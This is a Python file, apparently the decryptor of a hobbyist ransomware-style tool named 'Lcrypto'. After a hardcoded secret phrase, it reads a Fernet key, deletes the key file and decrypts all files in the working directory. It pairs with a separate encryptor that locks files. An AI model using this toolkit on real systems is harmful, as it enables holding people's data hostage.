# This is the second file using which Lcrypto will decrypt your files!
import os # Importing the built-in os module in python
from cryptography.fernet import Fernet # Importing the built-in cryptography module in python

# Like the other file let's define a main() function here too!
def main():
    try:
        files = [] # An empty files list where we will append the files!
    
        # For loop to check all the available files in the current directory
        for file in os.listdir():
            # Now we need to make sure that Lcrypto doesn't fo anything with Lcrypto.py, Lcrypto-key,key and Lcrypto-decrypt.py!
            if file == "Lcrypto.py" or file == "Lcrypto-key.key" or file == "Lcrypto-decrypt.py" or file == "Lcrypto.exe" or file == "Lcrypto-decrypt.exe":
                continue # Skipping these files
            if os.path.isfile(file): # Checking is its a valid file or not
                files.append(file) # Appending the available files to the files=[] list

        #print(files) use this to see the list of the files present in the current directory where this file is!


        # And here we go, declaring a secret phrase!

        secret_phrase = "decrypt"
        user_phrase = input("Enter the secret phrase to decrypt your files:\n") #Taking input from the user

        if user_phrase == "": # Checking if the input is empty or not!
            # Printing a message if the input is empty!
            return print("You didn't entered anything!!")
        if user_phrase == secret_phrase: # Let's check if the input matches our secret phrase or not!
            try:
                secret_key_file = "Lcrypto-key.key"
                with open("Lcrypto-key.key", "rb") as key: # Let's open the Lcrypto-key.key files where we had stored our secret file earlier!
                    secret_key = key.read() # Storing it in a variable
                os.remove(secret_key_file)
            except FileNotFoundError:
                return print("Decryption key not found!")
            for file in files: # For loop for checking the files!
                with open(file, "rb") as thefile: # Opening the files
                    contents = thefile.read() # Reading the file contents
                contents_decrypted = Fernet(secret_key).decrypt(contents) # And finally decrypting it!


                with open(file, "wb") as thefile: # Opening the file to write decrypted contents
                    thefile.write(contents_decrypted) # Writing the contents
        
            # And my friend here you go! Your files have been successfully decrypted!!
            print("\nCongrats! Your files has been decrypted!")

        else:
            # If the phrase entered is wrong!
            print("Oops! It seems like the phrase you entered isn't correct!")
    except KeyboardInterrupt:
        return print("\nYou interrupted the decrypting process!")
    
# Running the main() function here!
if __name__ == "__main__":
    main()